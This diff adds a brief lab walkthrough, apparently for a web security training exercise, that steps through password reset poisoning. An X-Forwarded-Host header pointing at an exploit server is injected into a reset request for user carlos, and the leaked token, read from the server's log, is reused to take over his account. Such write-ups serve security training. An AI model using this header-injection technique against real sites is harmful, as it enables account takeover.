@@ -1,0 +1,47 @@
+Password reset poisoning via middleware
+Goal: Exploit vulnerability in the password reset functionality and acess Carlos's account
+
+wiener:peter
+carlos
+
+1)
+-Click forgotpassword, wiener
+-Click Submit
+-Send the post to repeater
+
+-Open email client on exploit server
+-Click the reset link
+-Send the Get to repeater
+
+-Change password to password
+-Click Submit
+-Send post to repeater
+
+2)
+-Open the first post in repeater
+-Insert the following header under Accept-Language, X-Forwarded-Host:exploit-0aa900060492493c84d5aa9001aa00ad.exploit-server.net
+-Click Send
+-> 200 OK
+
+3)
+-Change the username argument to carlos
+-Click Send
+-> 200 OK
+
+4)
+-Exploit Server
+-Access Log
+-Grab temp-forgot-password-token, mcssoxgnvd3bkkoq5acss0yhryzgd8ot
+
+5)
+-Open first get in repeater
+-Paste the forgot-password-token in place of the one that is there, mcssoxgnvd3bkkoq5acss0yhryzgd8ot
+-Click Send
+
+6)
+-Open second post in repeater
+-Paste the forgot-password-token in place of the one that is there(twice), mcssoxgnvd3bkkoq5acss0yhryzgd8ot
+-Click Send
+
+7)
+-login carlos,password
